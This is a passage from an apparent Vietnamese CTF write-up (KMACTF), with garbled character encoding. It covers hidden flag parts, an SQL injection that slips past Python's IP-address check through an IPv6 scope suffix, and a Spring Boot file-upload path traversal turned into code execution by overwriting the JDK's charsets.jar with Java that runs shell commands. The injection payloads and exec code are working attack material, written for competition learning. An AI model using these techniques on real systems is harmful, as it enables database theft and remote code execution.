","date":"2024-09-03T16:46:31Z","permalink":"https://kev1n1203.github.io/p/cyberspace-ctf-2024/","title":"CyberSpace CTF 2024 write up - Twig Playground"},{"content":"pickleball URL: 157.15.86.73:8888 Challenge chia flag thÃ nh 3 pháº§n vÃ  giáº¥u chÃºng vÃ o trang web, mÃ¬nh dirsearch vÃ  tÃ¬m kiáº¿m trong request burp 1 lÃºc thÃ¬ tÃ¬m Ä‘Æ°á»£c: Part 1 náº±m á»Ÿ /robots.txt Part 2 náº±m táº¡i file js Part 3 á»Ÿ file css Flag: KMACTF{p1Ckleb4ll_WitH-uU_piCklepal_5a6b89113abb} malicip Preface URL: 157.15.86.73:18000 Source Code Táº¡i schema.sql mÃ¬nh tháº¥y flag Ä‘Æ°á»£c Ä‘Æ°a vÃ o báº£ng giáº¥u tÃªn REDACTED_TABLE vÃ  cá»™t giáº¥u tÃªn REDACTED_COLUMN, gá»£i Ã½ Ä‘á»ƒ solve challenge cáº§n dump database:\n1 2 3 4 5 6 CREATE TABLE `REDACTED_TABLE` ( `REDACTED_COLUMN` varchar(128) NOT NULL ); INSERT INTO `REDACTED_TABLE` (`REDACTED_COLUMN`) VALUES (\u0026#39;KMA{redacted, of course}\u0026#39;); NgoÃ i file app.py xá»­ lÃ½ 3 route cá»§a trang web, file config khÃ´ng cÃ³ cáº¥u hÃ¬nh gÃ¬ Ä‘áº·c biá»‡t nÃªn mÃ¬nh táº­p trung Ä‘i vÃ o Ä‘á»c file app.py. Äiá»u Ä‘áº·c biá»‡t Ä‘áº­p vÃ o máº¯t mÃ¬nh lÃ  route check-ip Ä‘Æ°á»£c truyá»n vÃ o tham sá»‘ URL ip dÃ­nh SQL Injection:\n1 2 3 4 5 6 7 8 9 10 @app.get(\u0026#34;/check-ip\u0026#34;) def check_ip(): ip = request.args.get(\u0026#39;ip\u0026#39;, None, ip_address) if ip is not None: result = query_db(f\u0026#34;SELECT ip, message FROM malicious_ip WHERE ip = \u0026#39;{ip}\u0026#39;\u0026#34;) return jsonify( [{\u0026#34;ip\u0026#34;: ip, \u0026#34;message\u0026#34;: message} for ip, message in result] ) else: return \u0026#34;invalid IP, now your IP seems suspicious\u0026#34;, 400 Tham sá»‘ ip náº¿u khÃ´ng Ä‘Æ°á»£c truyá»n vÃ o sáº½ máº·c Ä‘á»‹nh lÃ  null, cÃ²n khÃ´ng thÃ¬ Ä‘Æ°á»£c Ä‘Æ°a vÃ o hÃ m ipaddress.ip_address() Ä‘á»ƒ validate xem Ä‘Ã¢y cÃ³ pháº£i lÃ  má»™t IP há»£p lá»‡ hay khÃ´ng. Náº¿u ip thá»a mÃ£n sau khi hÃ m check ip_address thÃ¬ sáº½ Ä‘Æ°á»£c Ä‘Æ°a vÃ o cÃ¢u lá»‡nh SQL dÃ­nh SQLi, cÃ²n khÃ´ng tráº£ vá» status 400 Má»¥c Ä‘Ã­ch cá»§a challenge Ä‘Ã£ khÃ¡ rÃµ rÃ ng, viá»‡c mÃ¬nh cáº§n lÃ m lÃ  truyá»n vÃ o IP thá»a mÃ£n hÃ m ipaddress.ip_address(), Ä‘á»“ng thá»i váº«n pháº£i exploit SQL Injection. Äiá»u nÃ y khÃ´ng dá»… tÃ­ nÃ o khi hÃ m nÃ y check khÃ¡ cháº·t, thÃªm 1 dáº¥u nhÃ¡y hÃ m sáº½ tráº£ vá» exception ngay: MÃ¬nh máº¥t kha khÃ¡ thá»i gian cho viá»‡c chÃ¨n vÃ o Ä‘Æ°á»£c má»™t Ä‘á»‹a chá»‰ IP há»£p lá»‡ mÃ  chá»©a Ä‘Æ°á»£c cáº£ dáº¥u nhÃ¡y Ä‘Æ¡n. Äi tÃ¬m kiáº¿m cÃ¡c vuln cá»§a thÆ° viá»‡n nhÆ°ng cÅ©ng khÃ´ng cÃ³ gÃ¬ sá»­ dá»¥ng Ä‘Æ°á»£c cáº£ Äá»c láº¡i source code, tá»± nhiÃªn mÃ¬nh tháº¥y Ä‘á»‹a chá»‰ IPv6 Ä‘Æ°á»£c insert hÃ ng cuá»‘i khÃ¡ thÃº vá»‹, vÃ¬ nÃ³ váº«n cÃ³ thá»ƒ chá»©a cÃ¡c kÃ½ tá»±, mÃ¬nh tiáº¿p fuzzing tiáº¿p má»™t sá»‘ Ä‘á»‹a chá»‰ IPv6 nhÆ° abcd::dead:beef:abcd, nhÆ°ng váº«n chÆ°a thá»ƒ chÃ¨n Ä‘Æ°á»£c dáº¥u nhÃ¡y vÃ o vÃ¬ chá»‰ cÃ³ thá»ƒ chÃ¨n vÃ o cÃ¡c kÃ½ tá»± biá»ƒu diá»…n hex mÃ  thÃ´i\n1 2 3 4 5 6 7 8 INSERT INTO `malicious_ip` (`ip`,`message`) VALUES (\u0026#39;13.37.13.37\u0026#39;, \u0026#39;too leet\u0026#39;), (\u0026#39;103.12.104.72\u0026#39;, \u0026#39;phishing\u0026#39;), (\u0026#39;42.112.213.88\u0026#39;, \u0026#39;phishing\u0026#39;), (\u0026#39;2405:f980::1:12\u0026#39;, \u0026#39;phishing\u0026#39;), (\u0026#39;103.12.104.29\u0026#39;, \u0026#39;command \u0026amp; control server\u0026#39;), (\u0026#39;1337::dead:beef\u0026#39;, \u0026#39;dead leet\u0026#39;); LÆ°á»£n lá» cÃ¡c doc thÃ¬ mÃ¬nh tháº¥y cÃ³ pháº§n so sÃ¡nh táº¡i Ä‘Ã¢y khÃ¡ thÃº vá»‹ khi cÃ³ thá»ƒ chÃ¨n giÃ¡ trá»‹ Ä‘áº±ng sau Ä‘á»‹a chá»‰ IPv6 báº±ng dáº¥u % KhÃ´ng hiá»ƒu láº¯m nÃ³ cÃ³ tÃ¡c dá»¥ng gÃ¬, mÃ¬nh thá»­ chÃ¨n nhiá»u hÆ¡n lÃ  sá»‘ 1 vÃ o Ä‘áº±ng sau dáº¥u % thÃ¬ tháº¥y hoÃ n toÃ n valid, mÃ¬nh cÃ³ thá»ƒ truyá»n vÃ o gáº§n nhÆ° báº¥t cá»© thá»© gÃ¬, trong Ä‘Ã³ cÃ³ cáº£ dáº¥u nhÃ¡y: LÃ½ do cho viá»‡c nÃ y thÃ¬ ta cáº§n pháº£i Ä‘i Ä‘oáº¡n code xá»­ lÃ½ hÃ m ipaddress.ip_address(), hÃ m xÃ©t 2 trÆ°á»ng há»£p Ä‘á»‹a chá»‰ IP truyá»n vÃ o hoáº·c lÃ  IPv4 hay IPv6. Sau Ä‘Ã³ tiáº¿n hÃ nh check báº±ng viá»‡c gÃ¡n Ä‘á»‹a chá»‰ Ä‘Ã³ vÃ o 2 class, viá»‡c kiá»ƒm tra sáº½ Ä‘Æ°á»£c tiáº¿p tá»¥c diá»…n ra táº¡i phÆ°Æ¡ng thá»©c __init__ cá»§a 2 class Ä‘Ã³:\n1 2 3 4 5 6 7 8 9 10 11 12 def ip_address(address): try: return IPv4Address(address) except (AddressValueError, NetmaskValueError): pass try: return IPv6Address(address) except (AddressValueError, NetmaskValueError): pass raise ValueError(f\u0026#39;{address!r} does not appear to be an IPv4 or IPv6 address\u0026#39;) Äi hÃ m method __init__ cá»§a class IPv6Address, ta sáº½ tháº¥y Ä‘á»‹a chá»‰ IP Ä‘Æ°á»£c kiá»ƒm tra xem Ä‘Æ°á»£c truyá»n vÃ o theo kiá»ƒu sá»‘ nguyÃªn, hay kiá»ƒu há»—n há»£p, vÃ  cuá»‘i cÃ¹ng lÃ  kiá»ƒu chuá»—i -\u0026gt; kiá»ƒu mÃ  ta truyá»n vÃ o: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 def __init__(self, address): # Efficient constructor from integer. if isinstance(address, int): self._check_int_address(address) self._ip = address self._scope_id = None return # Constructing from a packed address if isinstance(address, bytes): self._check_packed_address(address, 16) self._ip = int.from_bytes(address, \u0026#39;big\u0026#39;) self._scope_id = None return # Assume input argument to be string or any object representation # which converts into a formatted IP string. addr_str = str(address) if \u0026#39;/\u0026#39; in addr_str: raise AddressValueError(f\u0026#34;Unexpected \u0026#39;/\u0026#39; in {address!r}\u0026#34;) addr_str, self._scope_id = self._split_scope_id(addr_str) self._ip = self._ip_int_from_string(addr_str) Tiáº¿p tá»¥c Ä‘i vÃ o hÃ m _split_scope_id, ta sáº½ tháº¥y Ä‘á»‹a chá»‰ IPv6 Ä‘Æ°á»£c chia thÃ nh 3 pháº§n thÃ´ng qua method partition(\u0026rsquo;%') addr lÃ  pháº§n Ä‘áº±ng trÆ°á»›c dáº¥u % sep lÃ  dáº¥u % scope_id lÃ  pháº§n Ä‘áº±ng sau dáº¥u % Náº¿u nhÆ° sep (hay dáº¥u %) khÃ´ng tá»“n táº¡i, máº·c Ä‘á»‹nh pháº§n Ä‘áº±ng sau cÅ©ng khÃ´ng tá»“n táº¡i, hay scope_id lÃ  None. CÃ²n náº¿u nhÆ° khÃ´ng tá»“n táº¡i scope_id mÃ  láº¡i xuáº¥t hiá»‡n dáº¥u % thÃ¬ quÃ¡ trÃ¬nh parse sáº½ dÃ­nh lá»—i mÃ  raise exception Náº¿u vá»«a cÃ³ sep, vá»«a cÃ³ scope_id thÃ¬ return 2 giÃ¡ trá»‹ addr -\u0026gt; Ä‘á»‹a chá»‰ IPv6 vÃ  scope_id -\u0026gt; pháº§n Ä‘áº±ng sau dáº¥u % 1 2 3 4 5 6 7 8 @staticmethod def _split_scope_id(ip_str): addr, sep, scope_id = ip_str.partition(\u0026#39;%\u0026#39;) if not sep: scope_id = None elif not scope_id or \u0026#39;%\u0026#39; in scope_id: raise AddressValueError(\u0026#39;Invalid IPv6 address: \u0026#34;%r\u0026#34;\u0026#39; % ip_str) return addr, scope_id VÃ­ dá»¥: Sau Ä‘Ã³ addr lÃ  giÃ¡ trá»‹ addr_str, Ä‘Æ°á»£c Ä‘Æ°a vÃ o hÃ m _ip_int_from_string Ä‘á»ƒ Ä‘Æ°a vá» dáº¡ng Ä‘á»‹a chá»‰, sau Ä‘Ã³ gÃ¡n vÃ o thuá»™c tÃ­nh _ip cá»§a object hiá»‡n táº¡i. CÃ²n _scope_id táº¡m thá»i khÃ´ng Ä‘Æ°á»£c sá»­ dá»¥ng tiáº¿p trong method __init__ NhÆ° váº­y vá» cÆ¡ báº£n thÃ¬ mÃ¬nh cÃ³ thá»ƒ bypass hÃ m check ipaddress.ip_address() báº±ng dáº¥u % Ä‘áº±ng sau 1 Ä‘á»‹a chá»‰ IPv6 valid: Exploit Viá»‡c khÃ³ Ä‘Ã£ lÃ m Ä‘Æ°á»£c, giá» mÃ¬nh chá»‰ cáº§n exploit SQLi Ä‘á»ƒ dump db lÃ  sol Ä‘Æ°á»£c challenge rá»“i. Lá»£i dá»¥ng viá»‡c route hiá»ƒn thá»‹ táº¥t cáº£ cÃ¡c row cá»§a cÃ¢u lá»‡nh select thÃ´ng qua vÃ²ng for, mÃ¬nh dÃ¹ng union based Ä‘á»ƒ láº¥y thÃ´ng tin luÃ´n: Táº¡i local thÃ¬ cÃ³ select tháº³ng luÃ´n vÃ¬ mÃ¬nh Ä‘Ã£ biáº¿t tÃªn báº£ng tÃªn cá»™t chá»©a flag: CÃ²n lÃªn server thÃ¬ mÃ¬nh sáº½ láº¥y thÃ´ng tin vá» tÃªn báº£ng trÆ°á»›c báº±ng tÃªn db malicip:\n1 1337::dead:beef%\u0026#39; union select null,table_name from information_schema.tables where table_schema=\u0026#34;malicip\u0026#34;-- - ÄÆ°á»£c tÃªn báº£ng lÃ  ______________________________________________m4LiC10u5_T413Le, mÃ¬nh tiáº¿p tá»¥c láº¥y cá»™t vÃ  láº¥y flag:\n1 1337::dead:beef%\u0026#39; union select null,column_name from information_schema.columns where table_name=\u0026#34;______________________________________________m4LiC10u5_T413Le\u0026#34;-- - 1 1337::dead:beef%\u0026#39; union select null,_____________________________________________MaL1ci0uS_c0lUmnN from ______________________________________________m4LiC10u5_T413Le-- - Flag: KMACTF{actually__this_flag-is_not_so_malicious_but_the_ipv6_is} spring up Preface ÄÃ¢y lÃ  má»™t challenge Java Spring boot mÃ  Ä‘á»™ng Ä‘áº¿n kiáº¿n thá»©c mÃ  mÃ¬nh chÆ°a tá»«ng tÃ¬m hiá»ƒu, cho nÃªn quÃ¡ trÃ¬nh searching Ä‘á»ƒ tÃ¬m ra Ä‘Ãºng lá»— há»•ng lÃ  ráº¥t lÃ¢u, sau Ä‘Ã³ mÃ¬nh cÅ©ng ngá»‘n tiáº¿p hÆ¡n 2 tiáº¿ng Ä‘á»ƒ build file exploit nÃªn mÃ¬nh solve challenge nÃ y khi cuá»™c thi chá»‰ cÃ²n 1 tiáº¿ng, ngáº§n Ä‘áº¥y khÃ´ng Ä‘á»§ thá»i gian Ä‘á»ƒ tÃ¬m ra hÆ°á»›ng cho bÃ i web cuá»‘i cÃ¹ng.\nSource Code Äáº§u tiÃªn xem xÃ©t Dockerfile, ta tháº¥y flag Ä‘Æ°á»£c move vá»›i kÃ½ hiá»‡u ngáº«u nhiÃªn, gá»£i Ã½ cho viá»‡c Ä‘á»ƒ solve challenge ta cáº§n pháº£i RCE:\n1 2 COPY flag.txt /flag.txt RUN mv /flag.txt /flag_$(cat /dev/urandom | tr -dc \u0026#39;a-zA-Z0-9\u0026#39; | fold -w 32 | head -n 1).txt Tiáº¿p tá»¥c Ä‘áº¿n docker compose, service spring boot Ä‘á»©ng sau 1 con reversed proxy nginx, vá»›i viá»‡c service backend phÃ­a sau Ä‘á»ƒ no-internet kháº³ng Ä‘á»‹nh khÃ´ng cÃ³ outbound ra ngoÃ i, loáº¡i bá» trÆ°á»ng há»£p sá»­ dá»¥ng curl/wget hay reverse shell khi RCE:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 version: \u0026#39;3\u0026#39; services: spring_up: container_name: spring_up build: build restart: always networks: - no-internet nginx: image: nginx:1.27.0-alpine restart: unless-stopped ports: - \u0026#34;8080:80\u0026#34; volumes: - ./build/nginx.conf:/etc/nginx/conf.d/default.conf depends_on: - spring_up networks: - internet - no-internet networks: internet: {} no-internet: internal: true FIle pom vÃ  config cÅ©ng khÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t nÃªn mÃ¬nh chuyá»ƒn qua Ä‘á»c web service controller luÃ´n. Website chá»§ yáº¿u phá»¥c vá»¥ 3 route chÃ­nh, vÃ  Ä‘Æ°á»£c code bÃªn trong class FileController, chÃºng Ä‘á»u Ä‘Æ°á»£c báº¯t Ä‘áº§u báº±ng prefix path: /file/ Route /file/testUI khi GET Ä‘áº¿n sáº½ render file upload.html hiá»ƒn thá»‹ form upload file:\n1 2 3 4 @GetMapping({\u0026#34;testUI\u0026#34;}) public String testUI() { return \u0026#34;upload\u0026#34;; } Form sáº½ gá»­i má»™t POST request Ä‘áº¿n route /file/uploadResource, táº¡i Ä‘Ã¢y file Ä‘Æ°á»£c xá»­ lÃ½ vÃ  black list cháº·n má»™t sá»‘ prefix file nháº¥t Ä‘á»‹nh:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 private static final String[] BLACK_LIST = new String[]{\u0026#34;etc\u0026#34;, \u0026#34;cron\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;var\u0026#34;, \u0026#34;proc\u0026#34;}; @PostMapping({\u0026#34;uploadResource\u0026#34;}) public ResponseEntity\u0026lt;String\u0026gt; uploadFile(@RequestParam(\u0026#34;file\u0026#34;) MultipartFile file) { if (file.isEmpty()) { return ResponseEntity.badRequest().body(\u0026#34;Please select a file to upload.\u0026#34;); } else { try { File theDir = new File(\u0026#34;uploads/\u0026#34;); if (!theDir.exists()) { theDir.mkdirs(); } byte[] bytes = file.getBytes(); String originalFilename = file.getOriginalFilename(); for(int i = 0; i \u0026lt; BLACK_LIST.length; ++i) { if (originalFilename.contains(BLACK_LIST[i])) { return ResponseEntity.badRequest().body(\u0026#34;Blacklist!!\u0026#34;); } } Path path = Paths.get(\u0026#34;uploads/\u0026#34; + file.getOriginalFilename()); Files.write(path, bytes, new OpenOption[0]); return ResponseEntity.ok(\u0026#34;File uploaded successfully: \u0026#34; + path); } catch (IOException var6) { var6.printStackTrace(); return ResponseEntity.status(500).body(\u0026#34;Failed to upload file.\u0026#34;); } } } Flow code cá»§a route nÃ y nhÆ° sau:\nKhá»Ÿi táº¡o thÆ° má»¥c uploads náº¿u chÆ°a tá»“n táº¡i Láº¥y ná»™i dung cá»§a file qua method MultipartFile.getBytes(), Ä‘á»“ng thá»i lÃ  filename báº±ng method MultipartFile.getOriginalFilename() -\u0026gt; method nÃ y sáº½ láº¥y toÃ n bá»™ tÃªn file, bao gá»“m cáº£ path nÃªn táº¡i Ä‘Ã¢y ta xÃ¡c Ä‘á»‹nh lá»— há»•ng upload file + path traversal TrÆ°á»›c khi lÆ°u file sáº½ Ä‘Æ°á»£c kiá»ƒm tra xem cÃ³ chá»©a cÃ¡c kÃ½ tá»± blacklist khÃ´ng, náº¿u cÃ³ thÃ¬ sáº½ cook luÃ´ng Sau Ä‘Ã³ file Ä‘Æ°á»£c lÆ°u táº¡i thÆ° má»¥c uploads, Ä‘á»“ng thá»i thÃ´ng bÃ¡o path ra ngoÃ i cho ngÆ°á»i dÃ¹ng NgoÃ i ra cÃ²n cÃ³ route /file/downloadResource dÃ¹ng Ä‘á»ƒ download file tá»« thÆ° má»¥c uploads:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 @GetMapping({\u0026#34;downloadResource\u0026#34;}) public ResponseEntity\u0026lt;String\u0026gt; downloadResource(@RequestParam String fileName) { String content; try { byte[] bytes = Files.readAllBytes(Paths.get(\u0026#34;uploads/\u0026#34; + fileName)); content = new String(bytes); } catch (Exception var5) { return ResponseEntity.status(HttpStatus.NOT_FOUND).body((Object)null); } MediaType mediaType = MediaType.parseMediaType(\u0026#34;application/octet-stream\u0026#34;); HttpHeaders headers = new HttpHeaders(); headers.setContentType(mediaType); headers.setContentDispositionFormData(\u0026#34;attachment\u0026#34;, fileName); return ((ResponseEntity.BodyBuilder)ResponseEntity.status(HttpStatus.OK).headers(headers)).body(content); } Vá» cÆ¡ báº£n thÃ¬ chá»©c nÃ y Ä‘á»c file tá»« path upload ná»‘i chuá»—i vá»›i request param fileName, tá»« Ä‘Ã³ expose lá»— há»•ng read file + path traversal ChÆ°Æ¡ng trÃ¬nh chá»‰ cÃ³ 2 route nÃ y lÃ  Ä‘Ã¡ng chÃº Ã½, vÃ¬ user cháº¡y web service lÃ  root nÃªn tá»•ng há»£p láº¡i mÃ¬nh Ä‘ang cÃ³:\nUpload file tÃ¹y Ã½ Read file tÃ¹y Ã½ TÆ°á»Ÿng ngon Äƒn nhÆ°ng láº¡i khÃ´ng há» ngon, ta khÃ´ng thá»ƒ upload web shell jsp vÃ¬ Spring Boot khÃ´ng code Ä‘á»ƒ phá»¥c vá»¥ viá»‡c hiá»ƒn thá»‹ thÆ° má»¥c uploads ra web, mÃ  chá»‰ cÃ³ thá»ƒ truy cáº­p Ä‘áº¿n thÃ´ng qua route /file/downloadResource Tá»« Ä‘Ã³, mÃ¬nh Ä‘Ã£ thá»­ kha khÃ¡ cÃ¡ch, má»™t sá»‘ cÃ³ thá»ƒ nÃ³i Ä‘áº¿n lÃ :\nUpload cÃ¡c file cÃ³ kháº£ nÄƒng tá»± Ä‘á»™ng thá»±c thi nhÆ° crontab, nhÆ°ng bá»‹ blacklist -\u0026gt; failed Upload ghi Ä‘Ã¨ html Ä‘á»ƒ trigger thymeleaf (maybe), nhÆ°ng chÆ°Æ¡ng trÃ¬nh Ä‘Æ°á»£c Ä‘Ã³ng gÃ³i thÃ nh file jar -\u0026gt; failed Searching tÃ i liá»‡u Trung Hoa vá» Spring boot upload file to RCE thÃ¬ mÃ¬nh tÃ¬m Ä‘Æ°á»£c lá»— há»•ng Spring boot Fat Jar táº¡i csdn, tá»« Ä‘Ã³ dáº«n tá»›i blog https://landgrey.me/blog/22/, Ä‘Ã£ nÃ³i chi tiáº¿t vá» quÃ¡ trÃ¬nh tÃ¬m vÃ  khai thÃ¡c lá»— há»•ng, kÃ¨m lab Ä‘i kÃ¨m + file jar ghi Ä‘Ã¨. Vá» cÆ¡ báº£n thÃ¬ lá»— há»•ng nÃ y cho phÃ©p ta Ä‘Æ°a tá»« ghi file báº¥t ká»³ lÃªn RCE thÃ´ng qua viá»‡c ghi Ä‘Ã¨ cÃ¡c file jar cÃ³ trong lib cá»§a JDK, tÃ¡c giáº£ lá»±a chá»n file charsets.jar vÃ¬ nÃ³ cÃ³ thá»ƒ trigger thÃ´ng qua header Accept táº¡i HTTP Request báº¥t ká»³ Äiá»u kiá»‡n Ä‘á»ƒ khai thÃ¡c lá»— há»•ng lÃ :\nBiáº¿t Ä‘Æ°á»£c tÃªn thÆ° má»¥c lib cá»§a JDK, vá»›i phiÃªn báº£n Ä‘Æ°á»£c docker cÃ i Ä‘áº·t lÃ  openjdk:8-jdk-alpine thÃ¬ nÃ³ sáº½ náº±m táº¡i: /usr/lib/jvm/java-1.8-openjdk/jre/lib/ File jar Ä‘Ã³ chÆ°a Ä‘Æ°á»£c server load Ä‘á»ƒ sá»­ dá»¥ng, váº­y nÃªn Ä‘Ã¢y lÃ  trÃ² chÆ¡i 1 láº§n, má»™t khi Ä‘Ã£ upload thÃ¬ náº¿u ta exploit khÃ´ng thÃ nh cÃ´ng sáº½ cáº§n pháº£i attack vÃ o lib khÃ¡c, hoáº·c Ä‘Æ¡n giáº£n hÆ¡n lÃ  deploy láº¡i Â¯\\(ãƒ„)/Â¯ (cháº¯c Ä‘Ã¢y cÅ©ng lÃ  lÃ½ do challenge nÃ y Ä‘Æ°á»£c deploy instance) Cá»¥ thá»ƒ vá» file jar cÅ©ng nhÆ° cÃ¡c táº¥n cÃ´ng thÃ¬ náº±m táº¡i: https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks/. MÃ¬nh git clone vá» Ä‘á»ƒ láº¥y file jar cá»§a há» test thá»­ cÅ©ng nhÆ° tá»± build thÃ nh 1 project. File jar cá»§a há» Ä‘Æ°á»£c build tá»« 2 file java class ExtendedCharsets dÃ¹ng Ä‘á»ƒ khai bÃ¡o cÃ¡c kiá»ƒu charset, cÃ²n IBM33722 dÃ¹ng Ä‘á»ƒ xá»­ lÃ½ vá»›i cÃ¡c kiá»ƒu charset Ä‘Ã³. Táº¡i IBM33722.class ta sáº½ tháº¥y khi kiá»ƒu charset nÃ o Ä‘Æ°á»£c kÃ­ch hoáº¡t á»Ÿ bÃªn ExtendedCharsets Ä‘á»u sáº½ thá»±c thi á»Ÿ file nÃ y, vÃ  khi khá»Ÿi táº¡o constructor cá»§a class IBM33722 sáº½ trigger method fun() thá»±c thi cÃ¢u lá»‡nh. ÄÃ¢y lÃ  cÃ¢u lá»‡nh Ä‘Æ°á»£c thá»±c thi bÃªn trong file jar máº«u cá»§a há»:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 private static HashMap\u0026lt;String, String\u0026gt; fun() { String var1 = UUID.randomUUID().toString().replace(\u0026#34;-\u0026#34;, \u0026#34;\u0026#34;).substring(1, 9); String var2 = System.getProperty(\u0026#34;os.name\u0026#34;); String[] var0; if (var2.startsWith(\u0026#34;Mac OS\u0026#34;)) { var0 = new String[]{\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;open -a Calculator\u0026#34;}; } else if (var2.startsWith(\u0026#34;Windows\u0026#34;)) { var0 = new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, \u0026#34;calc\u0026#34;}; } else if ((new File(\u0026#34;/bin/bash\u0026#34;)).exists()) { var0 = new String[]{\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;touch /tmp/charsets_test_\u0026#34; + var1 + \u0026#34;.log\u0026#34;}; } else { var0 = new String[]{\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;touch /tmp/charsets_test_\u0026#34; + var1 + \u0026#34;.log\u0026#34;}; } try { Runtime.getRuntime().exec(var0); } catch (Throwable var4) { var4.printStackTrace(); } return null; } Upload file jar ghi Ä‘Ã¨ file jar hiá»‡n táº¡i: Trigger báº±ng request kÃ¨m header: Accept: text/html;charset=GBK Kiá»ƒm tra táº¡i docker thÃ¬ ta tháº¥y 2 file log Ä‘Ã£ Ä‘Æ°á»£c khá»Ÿi táº¡o, chá»©ng tá» ta Ä‘Ã£ RCE thÃ nh cÃ´ng: Exploit Giá» cÃ´ng viá»‡c cá»§a mÃ¬nh lÃ  tá»± build láº¡i 1 file jar Ä‘á»ƒ thay vÃ¬ táº¡o file tmp mÃ¬nh sáº½ ghi flag vÃ o /tmp/flag.txt vÃ  rá»“i dÃ¹ng route downloadResource Ä‘á»ƒ Ä‘á»c flag VÃ¬ chÆ°a build file jar tá»« artifacts bao giá» mÃ  mÃ¬nh hay dÃ¹ng maven Ä‘á»ƒ package nÃªn mÃ¬nh tá»‘n ráº¥t nhiá»u thá»i gian cho viá»‡c nÃ y (cá»¥ thá»ƒ lÃ  2 tiáº¿ng rÆ°á»¡i) CÃ³ má»™t sá»‘ váº¥n Ä‘á» gáº·p pháº£i mÃ  mÃ¬nh lÆ°u Ã½:\nKhÃ´ng thá»ƒ nhÃ©t file .java vÃ o file jar vÃ¬ ta cáº§n lÃ  file java Ä‘Æ°á»£c compile thÃ nh file class Source code gen file jar cá»§a há» khÃ´ng cÃ³ main method, nÃªn Ä‘á»ƒ cháº¡y Ä‘Æ°á»£c ta cáº§n thÃªm method main vÃ o VÃ  cÅ©ng Ä‘á»«ng cÃ³ Ä‘i sá»­a source cá»§a há»™, tá»± build láº¡i tá»« source Ä‘Ã³ nhanh hÆ¡n nhiá»u =)) Báº¯t Ä‘áº§u tá»« viá»‡c khá»Ÿi táº¡o project má»›i, mÃ¬nh Ä‘á»ƒ tÃªn lÃ  charsets luÃ´n cho tiá»‡n, Ä‘á»“ng thá»i dÃ¹ng jdk 1.8 Táº¡i thÆ° má»¥c java mÃ¬nh chá»n new package, vÃ  nháº­p vÃ o package nhÆ° cá»§a author lÃ  sun.nio.cs.ext: Táº¡o 2 file Java clss bÃªn trong package vá»«a táº¡o vÃ  copy code vÃ´ :))), riÃªng táº¡i IBM33722.java thÃ¬ mÃ¬nh sáº½ sá»­a cÃ¢u lá»‡nh táº¡o file log, Ä‘á»“ng thá»i thÃªm main method vÃ o (khÃ´ng cÃ³ gÃ¬ khÃ´ng sao): ThÃªm folder META-INF vÃ  file MANIFEST.MF vÃ o bÃªn trong thÆ° má»¥c resource, copy ná»™i dung cá»§a file jar kia vÃ o: Tiáº¿n hÃ nh compile project nÃ y báº±ng cÃ¡ch cháº¡y nÃ³ thÃ´i, káº¿t quáº£ file class sáº½ náº±m táº¡i folder target: Tiáº¿n hÃ nh Ä‘Ã³ng gÃ³i thÃ nh file JAR táº¡i tab Project Structure, chá»n má»¥c Artifacts vÃ  chá»n táº¡o file JAR: Táº¡i Ä‘Ã¢y thÃ¬ mÃ¬nh khÃ´ng chá»n gÃ¬, vÃ¬ main method cÃ³ cÅ©ng khÃ´ng quan trá»ng láº¯m: LÃºc nÃ y file charsets.jar sáº½ chá»©a káº¿t quáº£ output cá»§a compile, Ä‘á»ƒ cháº¯c cháº¯n thÃ¬ mÃ¬nh thÃªm ná»™i dung bÃªn trong folder resource lÃ  folder META-INF Ä‘á»ƒ cháº¯c cÃº: Táº¡i tab Build chá»n Build Artifacts, file jar sáº½ Ä‘Æ°á»£c compile Kiá»ƒm tra file jar khá»Ÿi táº¡o thÃ¬ nÃ³ Ä‘Ã£ Ä‘áº§y Ä‘á»§ cÃ¡c thÃ nh pháº§n nhÆ° cá»§a file jar máº«u: thÆ° má»¥c chá»©a MANIFEST vÃ  2 file class Náº¿u nhÆ° nhÃ©t file java vÃ o file jar thÃ¬ file jar sáº½ náº·ng khoáº£ng 5KB, cÃ²n khi compile xong thÃ¬ nÃ³ sáº½ lÃ  11KB MÃ¬nh deploy láº¡i local Ä‘á»ƒ upload file jar má»›i, sau khi láº·p láº¡i cÃ¡c bÆ°á»›c trÃªn thÃ¬ file flag.txt Ä‘Ã£ Ä‘Æ°á»£c khá»Ÿi táº¡o táº¡i /tmp/flag.txt Káº¿t quáº£ trÃªn instance challenge: Flag: KMACTF{ayoooo00oo0ooo0o0o00o0ooooo000oo0oo0o00000} not so secure URL: 157.15.86.73:9999 ÄÃ¢y lÃ  challenge mÃ  mÃ¬nh khÃ´ng ká»‹p lÃ m trong 1 tiáº¿ng cuá»‘i trÆ°á»›c khi cuá»™c thi káº¿t thÃºc, nÃªn mÃ¬nh cÃ³ Ä‘i há»i vá» hÆ°á»›ng lÃ m, tá»« Ä‘Ã³ reproduce láº¡i Ä‘á»ƒ hiá»ƒu hÆ¡n\nBypass JWT ES256 Khi truy cáº­p vÃ o website, ta sáº½ Ä‘Æ°á»£c ghi hero name vÃ  quirk code: GiÃ¡ trá»‹ username Ä‘Æ°á»£c ghi vÃ o trong jwt, cÃ²n quirk code thÃ¬ Ä‘iá»n bao nhiá»u thÃ¬ quirk váº«n cÃ³ giÃ¡ trá»‹ lÃ  civilian thÃ´i. Website thÃ¬ cÃ³ file robots.txt cÃ³ má»™t chÃºt gá»£i Ã½ vá» viá»‡c mÃ£ hÃ³a ES256 diá»…n ra nhÆ° tháº¿ nÃ o: Äi theo gá»£i Ã½, mÃ¬nh tÃ¬m cÃ¡ch crack jwt Ä‘á»ƒ Ä‘Æ°a giÃ¡ trá»‹ cá»§a quirk vá» hero nhÆ°ng khÃ´ng ká»‹p. Sau Ä‘Ã³ thÃ¬ mÃ¬nh 